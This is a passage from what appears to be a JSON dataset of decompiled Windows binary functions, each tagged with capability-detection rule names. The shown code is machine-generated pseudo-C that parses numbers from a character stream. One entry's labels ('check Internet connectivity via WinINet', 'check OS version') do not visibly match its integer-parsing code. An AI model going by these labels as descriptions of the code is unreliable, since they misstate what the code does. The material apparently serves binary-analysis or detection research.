((*(iVar12 + 0x49) == cVar9) || (*(iVar12 + 0x48) == cVar9)) goto code_r0x00014004a498;\n            uVar15 = (cVar8 != cVar9) + 0x2b + (cVar8 != cVar9);\n        }\n        else {\n            if (*(iVar12 + 0x6e) != cVar9) goto code_r0x00014004a498;\n            if (cVar6 != '\\0') goto code_r0x00014004a6ba;\n            uVar15 = 0x2d;\n            cVar8 = *(iVar12 + 0x48);\njoined_r0x00014004a757:\n            if (cVar8 == cVar9) goto code_r0x00014004a498;\n        }\n        fcn.140077ac0(in_stack_00000038, uVar15);\n        fcn.140095670(uStack104);\n        uStack96 = 0xffffffff;\n        uVar19 = fcn.140023f10(&uStack104, &piStack120);\n        if (uVar19 == 0) {\n            uVar10 = fcn.140023fd0(&uStack104);\n            cVar6 = *(iVar12 + 0x20);\ncode_r0x00014004a498:\n            piVar3 = *0x140102a70;\n            uVar17 = 0;\n            iVar18 = 0;\n            do {\n                cVar8 = uVar10;\n                if ((((cVar6 != '\\0') && (uVar19 = uVar5,  *(iVar12 + 0x49) == cVar8)) ||\n                    (uVar19 = uVar5,  *(iVar12 + 0x48) == cVar8)) || (*(iVar12 + 0x72) != cVar8))\n                goto code_r0x000140049c40;\n                if (uVar17 == 0) {\n                    iVar14 = *in_stack_00000038;\n                    iVar1 = *(iVar14 + -0x18);\n                    uVar13 = iVar1 + 1;\n                    if (*(iVar14 + -0x10) < uVar13) {\ncode_r0x00014004a586:\n                        fcn.140077810(in_stack_00000038, uVar13);\n                    }\n                    else {\n                        if (*piVar3 == 0) {\n                            iVar11 = *(iVar14 + -8);\n                        }\n                        else {\n                            iVar11 = *(iVar14 + -8);\n                        }\n                        if (0 < iVar11) goto code_r0x00014004a586;\n                    }\n                    *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = 0x30;\n                    iVar14 = *in_stack_00000038;\n                    *(iVar14 + -8) = 0;\n                    *(iVar14 + -0x18) = uVar13;\n                    *(iVar14 + 1 + iVar1) = 0;\n                }\n                piVar4 = uStack104;\n                iVar18 = iVar18 + 1;\n                if (uStack104[2] < uStack104[3]) {\n                    uVar13 = uStack104[2] + 1;\n                    uStack96 = 0xffffffff;\n                    uStack104[2] = uVar13;\n                    if (uVar13 < uStack104[3]) goto code_r0x00014004a4ff;\ncode_r0x00014004a608:\n                    uStack96 = 0xffffffff;\n                    iVar11 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar11 != -1) goto code_r0x00014004a4ff;\n                    uStack104 = NULL;\n                    bVar21 = true;\n                }\n                else {\n                    (**(*uStack104 + 0x50))(uStack104);\n                    uStack96 = 0xffffffff;\n                    if (piVar4[3] <= piVar4[2]) goto code_r0x00014004a608;\ncode_r0x00014004a4ff:\n                    bVar21 = false;\n                }\n                bVar16 = piStack120 != NULL && iStack112 == -1;\n                bVar20 = iStack112 == -1;\n                if (bVar16) {\n                    if ((piStack120[2] < piStack120[3]) || (iVar11 = (**(*piStack120 + 0x48))(),  iVar11 != -1)) {\n                        bVar20 = false;\n                    }\n                    else {\n                        piStack120 = NULL;\n                        bVar20 = bVar16;\n                    }\n                }\n                if (bVar21 == bVar20) goto code_r0x00014004a521;\n                if (uStack104 == NULL) {\ncode_r0x00014004a650:\n                    uVar10 = 0xffffffff;\n                }\n                else if (uStack104[2] < uStack104[3]) {\n                    uVar10 = *uStack104[2];\n                }\n                else {\n                    uVar10 = (**(*uStack104 + 0x48))();\n                    if (uVar10 == 0xffffffff) {\n                        uStack104 = NULL;\n                        goto code_r0x00014004a650;\n                    }\n                }\n                cVar6 = *(iVar12 + 0x20);\n                uVar17 = 1;\n            } while( true );\n        }\n        uVar17 = 0;\n        iVar18 = 0;\n    }\n    else {\n        uVar10 = 0;\n        iVar18 = 0;\n        uVar17 = 0;\n        uVar19 = uVar5;\n    }\n    goto code_r0x000140049c40;\ncode_r0x000140049e46:\n    do {\n        cVar8 = uVar10;\n        if (*(iVar12 + 0x48) == cVar8) {\n            uStack145 = uStack145 | uVar19;\n            if (uStack145 != 0) goto code_r0x00014004a72f;\n            if (*(aiStack80[0] + -0x18) != 0) {\n                fcn.140077ac0(aiStack80, cVar6);\n            }\n            iVar14 = *in_stack_00000038;\n            iVar1 = *(iVar14 + -0x18);\n            uVar13 = iVar1 + 1;\n            if (*(iVar14 + -0x10) < uVar13) {\ncode_r0x00014004a02c:\n                fcn.140077810(in_stack_00000038, uVar13);\n            }\n            else {\n                if (**0x140102a70 == 0) {\n                    iVar11 = *(iVar14 + -8);\n                }\n                else {\n                    iVar11 = *(iVar14 + -8);\n                }\n                if (0 < iVar11) goto code_r0x00014004a02c;\n            }\n            *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = 0x2e;\n            iVar14 = *in_stack_00000038;\n            *(iVar14 + -8) = 0;\n            *(iVar14 + -0x18) = uVar13;\n            *(iVar14 + 1 + iVar1) = 0;\n            uVar19 = uVar5;\n            goto code_r0x000140049edd;\n        }\n        iVar14 = sub.msvcrt.dll_memchr(iVar12 + 0x72);\n        if (iVar14 != 0) {\n            iVar1 = *in_stack_00000038;\n            iVar2 = *(iVar1 + -0x18);\n            uVar13 = iVar2 + 1;\n            if (*(iVar1 + -0x10) < uVar13) {\ncode_r0x000140049ea1:\n                fcn.140077810(in_stack_00000038, uVar13);\n            }\n            else {\n                if (**0x140102a70 == 0) {\n                    iVar11 = *(iVar1 + -8);\n                }\n                else {\n                    iVar11 = *(iVar1 + -8);\n                }\n                if (0 < iVar11) goto code_r0x000140049ea1;\n            }\n            iVar18 = iVar18 + 1;\n            *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = (iVar14 - (iVar12 + 0x72)) + '0';\n            iVar14 = *in_stack_00000038;\n            *(iVar14 + -8) = 0;\n            *(iVar14 + -0x18) = uVar13;\n            *(iVar14 + 1 + iVar2) = 0;\n            uVar17 = uVar5;\n            goto code_r0x000140049edd;\n        }\n        if ((*(iVar12 + 0x80) != cVar8) && (*(iVar12 + 0x86) != cVar8)) goto code_r0x000140049f36;\n        uVar17 = uVar17 & (uStack145 ^ 1);\n        if (uVar17 == 0) goto code_r0x000140049f36;\n        if ((*(aiStack80[0] + -0x18) != 0) && (uVar19 == 0)) {\n            fcn.140077ac0(aiStack80, cVar6);\n        }\n        iVar14 = *in_stack_00000038;\n        iVar1 = *(iVar14 + -0x18);\n        uVar13 = iVar1 + 1;\n        if (*(iVar14 + -0x10) < uVar13) {\ncode_r0x00014004a0fc:\n            fcn.140077810(in_stack_00000038, uVar13);\n        }\n        else {\n            if (**0x140102a70 == 0) {\n                iVar11 = *(iVar14 + -8);\n            }\n            else {\n                iVar11 = *(iVar14 + -8);\n            }\n            if (0 < iVar11) goto code_r0x00014004a0fc;\n        }\n        *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = 0x65;\n        iVar14 = *in_stack_00000038;\n        *(iVar14 + -8) = 0;\n        *(iVar14 + -0x18) = uVar13;\n        *(iVar14 + 1 + iVar1) = 0;\n        if (uStack104[2] < uStack104[3]) {\n            uStack104[2] = uStack104[2] + 1;\n        }\n        else {\n            (**(*uStack104 + 0x50))();\n        }\n        uStack96 = 0xffffffff;\n        cVar8 = fcn.140023f10(&uStack104, &piStack120);\n        if (cVar8 != '\\0') goto code_r0x00014004a72f;\n        uVar10 = uStack96;\n        if ((uStack104 != NULL) && (uStack96 == 0xffffffff)) {\n            if (uStack104[2] < uStack104[3]) {\n                uVar10 = *uStack104[2];\n            }\n            else {\n                uVar10 = (**(*uStack104 + 0x48))();\n                if (uVar10 == 0xffffffff) {\n                    uStack104 = NULL;\n                }\n            }\n        }\n        cVar8 = *(iVar12 + 0x6f);\n        uVar7 = *(iVar12 + 0x20);\n        cVar9 = uVar10;\n        uStack145 = uVar17;\n        if (cVar8 == cVar9) {\n            if (uVar7 != 0) goto code_r0x00014004a3a0;\n            uVar13 = 0x2b;\n            cVar8 = *(iVar12 + 0x48);\n        }\n        else {\n            if (*(iVar12 + 0x6e) != cVar9) goto code_r0x000140049e38;\n            if (uVar7 != 0) {\ncode_r0x00014004a3a0:\n                uVar7 = uVar17;\n                if ((*(iVar12 + 0x49) == cVar9) || (*(iVar12 + 0x48) == cVar9)) goto code_r0x000140049e38;\n                uVar13 = (cVar8 != cVar9) + 0x2b + (cVar8 != cVar9);\n                break;\n            }\n            uVar13 = 0x2d;\n            cVar8 = *(iVar12 + 0x48);\n        }\n    } while (cVar9 == cVar8);\n    fcn.140077ac0(in_stack_00000038, uVar13);\ncode_r0x000140049edd:\n    piVar4 = uStack104;\n    if (uStack104[2] < uStack104[3]) {\n        uVar13 = uStack104[2] + 1;\n        uStack96 = 0xffffffff;\n        bVar21 = false;\n        uStack104[2] = uVar13;\n        if (uVar13 < uStack104[3]) goto code_r0x000140049f0e;\n    }\n    else {\n        (**(*uStack104 + 0x50))(uStack104);\n        uStack96 = 0xffffffff;\n        bVar21 = false;\n        if (piVar4[2] < piVar4[3]) goto code_r0x000140049f0e;\n    }\n    uStack96 = 0xffffffff;\n    iVar11 = (**(*piVar4 + 0x48))(piVar4);\n    if (iVar11 == -1) {\n        uStack104 = NULL;\n    }\n    bVar21 = iVar11 == -1;\ncode_r0x000140049f0e:\n    bVar20 = iStack112 == -1;\n    if (((piStack120 != NULL) && (bVar20)) && (bVar20 = false,  piStack120[3] <= piStack120[2])) {\n        iVar11 = (**(*piStack120 + 0x48))();\n        bVar20 = iVar11 == -1;\n        if (bVar20) {\n            piStack120 = NULL;\n        }\n    }\n    if (bVar21 == bVar20) goto code_r0x000140049f36;\n    if (uStack104 == NULL) {\n        uVar10 = 0xffffffff;\n    }\n    else if (uStack104[2] < uStack104[3]) {\n        uVar10 = *uStack104[2];\n    }\n    else {\n        uVar10 = (**(*uStack104 + 0x48))();\n        if (uVar10 == 0xffffffff) {\n            uStack104 = NULL;\n        }\n    }\n    uVar7 = *(iVar12 + 0x20);\n    goto code_r0x000140049e38;\ncode_r0x000140049d61:\n    uVar5 = *uStack104[2];\n    uVar10 = uVar5;\n    goto joined_r0x000140049c90;\ncode_r0x00014004a72f:\n    iVar14 = aiStack80[0];\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140049f8c;\n    goto code_r0x000140049f6a;\ncode_r0x00014004a521:\n    uVar17 = 1;\n    uVar19 = 1;\ncode_r0x000140049c40:\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar12 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    piVar3 = *0x140102a70;\n    uVar5 = *(iVar12 + 0x88);\n    if (uVar5 == 0) {\n        if (uVar19 == 0) {\n            uStack145 = 0;\ncode_r0x000140049c8b:\n            uVar5 = uVar10;\njoined_r0x000140049c90:\n            if (9 < uVar5 - 0x30) {\n                uVar7 = uVar5;\n                if (*(iVar12 + 0x48) == uVar5) goto code_r0x00014004a2af;\n                goto code_r0x000140049d80;\n            }\n            iVar14 = *in_stack_00000038;\n            iVar1 = *(iVar14 + -0x18);\n            uVar13 = iVar1 + 1;\n            if (uVar13 <= *(iVar14 + -0x10)) {\n                if (*piVar3 == 0) {\n                    iVar11 = *(iVar14 + -8);\n                }\n                else {\n                    iVar11 = *(iVar14 + -8);\n                }\n                if (iVar11 < 1) goto code_r0x000140049ccc;\n            }\n            fcn.140077810(in_stack_00000038, uVar13);\ncode_r0x000140049ccc:\n            *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = uVar10;\n            iVar14 = *in_stack_00000038;\n            *(iVar14 + -8) = 0;\n            *(iVar14 + -0x18) = uVar13;\n            *(iVar14 + 1 + iVar1) = 0;\n            uVar17 = 1;\ncode_r0x000140049cf1:\n            piVar4 = uStack104;\n            if (uStack104[2] < uStack104[3]) {\n                uVar13 = uStack104[2] + 1;\n                uStack96 = 0xffffffff;\n                bVar21 = false;\n                uStack104[2] = uVar13;\n                if (uStack104[3] <= uVar13) {\ncode_r0x00014004a260:\n                    uStack96 = 0xffffffff;\n                    iVar11 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar11 == -1) {\n                        uStack104 = NULL;\n                    }\n                    bVar21 = iVar11 == -1;\n                }\n            }\n            else {\n                (**(*uStack104 + 0x50))(uStack104);\n                uStack96 = 0xffffffff;\n                bVar21 = false;\n                if (piVar4[3] <= piVar4[2]) goto code_r0x00014004a260;\n            }\n            bVar20 = iStack112 == -1;\n            if (((piStack120 != NULL) && (bVar20)) && (bVar20 = false,  piStack120[3] <= piStack120[2])) {\n                iVar11 = (**(*piStack120 + 0x48))();\n                bVar20 = iVar11 == -1;\n                if (bVar20) {\n                    piStack120 = NULL;\n                }\n            }\n            if (bVar20 == bVar21) goto code_r0x000140049f36;\n            if (uStack104 != NULL) {\n                if (uStack104[2] < uStack104[3]) goto code_r0x000140049d61;\n                uVar10 = (**(*uStack104 + 0x48))();\n                if (uVar10 != 0xffffffff) goto code_r0x000140049c8b;\n                uStack104 = NULL;\n            }\n            uVar5 = 0xff;\n            uVar7 = 0xff;\n            if (*(iVar12 + 0x48) == -1) {\ncode_r0x00014004a2af:\n                uVar5 = uVar7;\n                if ((uStack145 | uVar19) != 0) goto code_r0x000140049d80;\n                uVar19 = 1;\n                fcn.140077ac0(in_stack_00000038, 0x2e);\n                uStack145 = 0;\n            }\n            else {\ncode_r0x000140049d80:\n                if (((*(iVar12 + 0x80) != uVar5) && (*(iVar12 + 0x86) != uVar5)) ||\n                   (uVar17 = uVar17 & (uStack145 ^ 1),  uVar17 == 0)) goto code_r0x000140049f36;\n                fcn.140077ac0(in_stack_00000038, 0x65);\n                fcn.140095670(uStack104);\n                uStack96 = 0xffffffff;\n                cVar6 = fcn.140023f10(&uStack104, &piStack120);\n                if (cVar6 != '\\0') goto code_r0x00014004a72f;\n                uVar10 = fcn.140023fd0(&uStack104);\n                uStack145 = uVar17;\n                if (*(iVar12 + 0x6f) == uVar10) {\n                    arg2 = 0x2b;\n                }\n                else {\n                    arg2 = 0x2d;\n                    if (uVar10 != *(iVar12 + 0x6e)) goto code_r0x000140049c8b;\n                }\n                fcn.140077ac0(in_stack_00000038, arg2);\n            }\n            goto code_r0x000140049cf1;\n        }\ncode_r0x00014004a775:\n        iVar14 = aiStack80[0];\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140049f8c;\ncode_r0x000140049f54:\n        fcn.140077ac0(aiStack80, iVar18);\n    }\n    else {\n        if (uVar19 != 0) goto code_r0x00014004a775;\n        uStack145 = 0;\n        uVar7 = *(iVar12 + 0x20);\ncode_r0x000140049e38:\n        cVar6 = iVar18;\n        if ((uVar7 == 0) || (*(iVar12 + 0x49) != uVar10)) goto code_r0x000140049e46;\n        uVar19 = uVar19 | uStack145;\n        if (uVar19 != 0) goto code_r0x00014004a72f;\n        if (iVar18 != 0) {\n            fcn.140077ac0(aiStack80, cVar6);\n            uStack145 = 0;\n            iVar18 = 0;\n            goto code_r0x000140049edd;\n        }\n        fcn.140077920(in_stack_00000038, 0, *(*in_stack_00000038 + -0x18), 0);\n        uStack145 = 0;\ncode_r0x000140049f36:\n        iVar14 = aiStack80[0];\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140049f8c;\n        if ((uVar19 == 0) && (uStack145 == 0)) goto code_r0x000140049f54;\n    }\ncode_r0x000140049f6a:\n    iVar14 = aiStack80[0];\n    cVar6 = fcn.1400b15c0(*(iVar12 + 0x10), *(iVar12 + 0x18), aiStack80);\n    if (cVar6 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\ncode_r0x000140049f8c:\n    *arg1 = uStack104;\n    arg1[1] = uStack104._4_4_;\n    arg1[2] = uStack96;\n    arg1[3] = uStack92;\n    fcn.140075fa0(iVar14 + -0x18);\n    return arg1;\n}\n",
        "token_count": 5844
    },
    "1400513d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.1400513d0(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    char cVar8;\n    int16_t iVar9;\n    int16_t iVar10;\n    uint16_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    int64_t iVar14;\n    int16_t *piVar15;\n    int16_t *piVar16;\n    uint16_t *puVar17;\n    int64_t iVar18;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    int32_t iVar21;\n    uint8_t uVar22;\n    uint32_t uVar23;\n    bool bVar24;\n    bool bVar25;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    int64_t iStack152;\n    uint32_t uStack136;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint16_t uStack96;\n    ushort uStack94;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    uStack96 = *(in_R8 + 1);\n    uStack94 = *(in_R8 + 1) >> 0x10;\n    iVar14 = fcn.1400210c0(in_stack_00000028 + 0xd0);\n    uVar23 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar23 == 0x40) {\n        uVar20 = 8;\ncode_r0x000140051438:\n        uVar7 = fcn.140024020(&piStack104, &piStack120);\n        if (uVar7 == 0) {\ncode_r0x000140051457:\n            uVar11 = uStack96;\n            if ((uStack96 == 0xffff) && (piStack104 != NULL)) {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            cVar8 = *(iVar14 + 0x20);\n            if ((*(iVar14 + 0x94) == uVar11) || (bVar25 = false,  *(iVar14 + 0x96) == uVar11)) {\n                bVar25 = *(iVar14 + 0x94) == uVar11;\n                if (cVar8 != '\\0') {\n                    if ((*(iVar14 + 0x4a) != uVar11) && (*(iVar14 + 0x48) != uVar11)) goto code_r0x00014005176a;\n                    goto code_r0x000140051496;\n                }\n                if (*(iVar14 + 0x48) == uVar11) goto code_r0x000140051496;\ncode_r0x00014005176a:\n                fcn.1400960e0(piStack104);\n                uStack96 = 0xffff;\n                uVar7 = fcn.140024020(&piStack104, &piStack120);\n                if (uVar7 == 0) {\n                    uVar11 = fcn.1400240d0(&piStack104);\n                    cVar8 = *(iVar14 + 0x20);\n                    goto code_r0x000140051496;\n                }\n                iVar21 = 0;\n                bVar3 = false;\n            }\n            else {\ncode_r0x000140051496:\n                iVar21 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar8 == '\\0' || (*(iVar14 + 0x4a) != uVar11)) &&\n                       (*(iVar14 + 0x48) != uVar11))) {\n                    if (*(iVar14 + 0x9c) == uVar11) {\n                        bVar3 = bVar3 ^ 1U | uVar20 == 10;\n                        if (!bVar3) goto code_r0x0001400514c9;\n                        bVar24 = uVar20 == 8;\n                        if (bVar24 || uVar23 == 0) {\n                            iVar21 = 0;\n                            uVar20 = 8;\n                            bVar3 = bVar24 || uVar23 == 0;\n                        }\n                        else {\n                            iVar21 = iVar21 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x0001400514c9:\n                        if ((*(iVar14 + 0x98) != uVar11) && (*(iVar14 + 0x9a) != uVar11)) {\n                            uVar7 = 0;\n                            bVar3 = true;\n                            goto code_r0x000140051572;\n                        }\n                        uVar7 = uVar20 == 0x10 || uVar23 == 0;\n                        if (uVar20 != 0x10 && uVar23 != 0) {\n                            bVar3 = true;\n                            goto code_r0x00014005157c;\n                        }\n                        iVar21 = 0;\n                        uVar20 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        piVar15 = piStack104[2] + 1;\n                        piStack104[2] = piVar15;\n                        if (piVar15 < piStack104[3]) goto code_r0x000140051532;\ncode_r0x0001400519e0:\n                        uStack96 = 0xffff;\n                        iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        piVar15 = piVar4[2];\n                        if (piVar4[3] <= piVar15) goto code_r0x0001400519e0;\ncode_r0x000140051532:\n                        uStack96 = 0xffff;\n                        iVar10 = *piVar15;\n                    }\n                    if (iVar10 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bVar24 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar24)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar9 = *piStack120[2];\n                        }\n                        else {\n                            iVar9 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar9 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar24 = iVar9 == -1;\n                    }\n                    if ((iVar10 == -1) == bVar24) {\n                        uVar7 = 1;\n                        goto code_r0x000140051572;\n                    }\n                    uVar11 = 0xffff;\n                    if (piStack104 != NULL) {\n                        if (piStack104[2] < piStack104[3]) {\n                            uVar11 = *piStack104[2];\n                        }\n                        else {\n                            uVar11 = (**(*piStack104 + 0x48))();\n                        }\n                        if (uVar11 == 0xffff) {\n                            piStack104 = NULL;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar8 = *(iVar14 + 0x20);\n                }\n                uVar7 = 0;\n            }\ncode_r0x000140051572:\n            if (uVar20 == 0x10) goto code_r0x0001400517d9;\n        }\n        else {\n            bVar25 = false;\n            uVar11 = 0;\n            iVar21 = 0;\n            bVar3 = false;\n        }\ncode_r0x00014005157c:\n        iStack152 = uVar20;\n        uStack136 = uVar20;\n    }\n    else {\n        uVar20 = 10;\n        if (uVar23 != 8) goto code_r0x000140051438;\n        uVar20 = 0x10;\n        uVar7 = fcn.140024020(&piStack104, &piStack120);\n        if (uVar7 == 0) goto code_r0x000140051457;\n        bVar25 = false;\n        uVar11 = 0;\n        iVar21 = 0;\n        bVar3 = false;\ncode_r0x0001400517d9:\n        uStack136 = 0x10;\n        uVar20 = 0x16;\n        iStack152 = 0x16;\n    }\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar14 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar23 = 0xffffffff / uStack136;\n    uVar2 = *(iVar14 + 200);\n    uVar5 = uVar7;\n    if (uVar2 == 0) {\n        uVar22 = 0;\n        if (uVar7 == 0) {\n            uVar13 = 0;\ncode_r0x0001400515ec:\n            uVar12 = uVar11;\n            if (uVar20 < 0xb) {\n                if ((uVar11 < 0x30) || (iStack152 + 0x30U <= uVar11)) goto code_r0x0001400518b8;\n            }\n            else if (9 < uVar11 - 0x30) {\n                if (5 < uVar11 - 0x61) goto code_r0x000140051a64;\n                uVar12 = uVar12 - 0x57;\n                goto code_r0x000140051611;\n            }\n            uVar12 = uVar12 - 0x30;\ncode_r0x000140051611:\n            do {\n                piVar4 = piStack104;\n                if (uVar23 < uVar13) {\n                    uVar22 = 1;\n                }\n                else {\n                    uVar19 = uVar13 * uStack136;\n                    uVar13 = uVar12 + uVar19;\n                    iVar21 = iVar21 + 1;\n                    uVar22 = uVar22 | CARRY4(uVar12, uVar19);\n                }\n                piVar15 = piStack104[3];\n                if (piStack104[2] < piVar15) {\n                    piVar16 = piStack104[2] + 1;\n                    piStack104[2] = piVar16;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    piVar16 = piVar4[2];\n                    piVar15 = piVar4[3];\n                }\n                uStack96 = 0xffff;\n                if (piVar16 < piVar15) {\n                    iVar10 = *piVar16;\n                }\n                else {\n                    iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                }\n                if (iVar10 == -1) {\n                    piStack104 = NULL;\n                }\n                bVar24 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar24)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar24 = iVar9 == -1;\n                }\n                if ((iVar10 == -1) == bVar24) {\n                    uVar2 = 1;\n                    goto code_r0x0001400516a5;\n                }\n                if (piStack104 != NULL) {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar11 = *piStack104[2];\n                    }\n                    else {\n                        uVar11 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar11 != 0xffff) goto code_r0x0001400515ec;\n                    piStack104 = NULL;\n                }\n                if (uVar20 < 0xb) goto code_r0x0001400518b8;\n                uVar12 = 0xffff;\n                uVar11 = 0xffff;\ncode_r0x000140051a64:\n                if (5 < uVar11 - 0x41) goto code_r0x0001400518b8;\n                uVar12 = uVar12 - 0x37;\n            } while( true );\n        }\n        uVar13 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\n    else {\n        if (uVar7 == 0) {\n            uVar22 = 0;\n            uVar13 = 0;\ncode_r0x000140051aa0:\n            if ((*(iVar14 + 0x20) == 0) || (*(iVar14 + 0x4a) != uVar11)) {\n                puVar17 = iVar14 + 0x9c;\n                iVar18 = iStack152;\n                if (*(iVar14 + 0x48) == uVar11) goto code_r0x0001400518b8;\n                while (uVar11 != *puVar17) {\n                    iVar18 = iVar18 + -1;\n                    puVar17 = puVar17 + 1;\n                    if (iVar18 == 0) goto code_r0x0001400518b8;\n                }\n                uVar20 = puVar17 - (iVar14 + 0x9c) >> 1;\n                if (0xf < uVar20) {\n                    uVar20 = uVar20 - 6;\n                }\n                uVar6 = uVar2;\n                if (uVar13 <= uVar23) {\n                    uVar12 = uVar13 * uStack136;\n                    uVar13 = uVar20 + uVar12;\n                    iVar21 = iVar21 + 1;\n                    uVar6 = uVar22 | CARRY4(uVar20, uVar12);\n                }\n            }\n            else {\n                if (iVar21 == 0) {\n                    uVar5 = *(iVar14 + 0x20);\n                    uVar2 = 0;\n                    goto code_r0x0001400516a5;\n                }\n                fcn.140077ac0(aiStack80, iVar21);\n                iVar21 = 0;\n                uVar6 = uVar22;\n            }\n            uVar22 = uVar6;\n            piVar4 = piStack104;\n            piVar15 = piStack104[3];\n            if (piStack104[2] < piVar15) {\n                piVar16 = piStack104[2] + 1;\n                piStack104[2] = piVar16;\n            }\n            else {\n                (**(*piStack104 + 0x50))(piStack104);\n                piVar16 = piVar4[2];\n                piVar15 = piVar4[3];\n            }\n            uStack96 = 0xffff;\n            if (piVar16 < piVar15) {\n                iVar10 = *piVar16;\n            }\n            else {\n                iVar10 = (**(*piVar4 + 0x48))(piVar4);\n            }\n            if (iVar10 == -1) {\n                piStack104 = NULL;\n            }\n            bVar24 = uStack112 == -1;\n            if ((piStack120 != NULL) && (bVar24)) {\n                if (piStack120[2] < piStack120[3]) {\n                    iVar9 = *piStack120[2];\n                }\n                else {\n                    iVar9 = (**(*piStack120 + 0x48))();\n                }\n                if (iVar9 == -1) {\n                    piStack120 = NULL;\n                }\n                bVar24 = iVar9 == -1;\n            }\n            if ((iVar10 == -1) == bVar24) goto code_r0x0001400516a5;\n            if (piStack104 == NULL) {\n                uVar11 = 0xffff;\n            }\n            else {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            goto code_r0x000140051aa0;\n        }\n        uVar13 = 0;\n        uVar22 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\ncode_r0x0001400516a5:\n    uVar7 = uVar5;\n    if (*(aiStack80[0] + -0x18) != 0) goto code_r0x0001400518cd;\ncode_r0x0001400516b8:\n    if ((iVar21 != 0) || (bVar3)) {\ncode_r0x000140051911:\n        if (uVar7 == 0) {\n            if (uVar22 == 0) {\n                if (bVar25) {\n                    uVar13 = -uVar13;\n                }\n                *in_stack_00000038 = uVar13;\n            }\n            else {\n                *in_stack_00000038 = 0xffffffff;\n                *in_stack_00000030 = 4;\n            }\n            goto code_r0x0001400516e7;\n        }\n    }\n    goto code_r0x0001400516cb;\ncode_r0x0001400518b8:\n    uVar2 = 0;\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x0001400516b8;\ncode_r0x0001400518cd:\n    fcn.140077ac0(aiStack80, iVar21);\n    cVar8 = fcn.1400b15c0(*(iVar14 + 0x10), *(iVar14 + 0x18), aiStack80);\n    if (cVar8 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\n    if (((iVar21 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x000140051911;\ncode_r0x0001400516cb:\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x0001400516e7:\n    if (uVar2 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar21 = **0x140102a70;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, CONCAT22(uStack94, uStack96));\n    if (iVar21 == 0) {\n        iVar21 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar21 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar21 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar21 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, 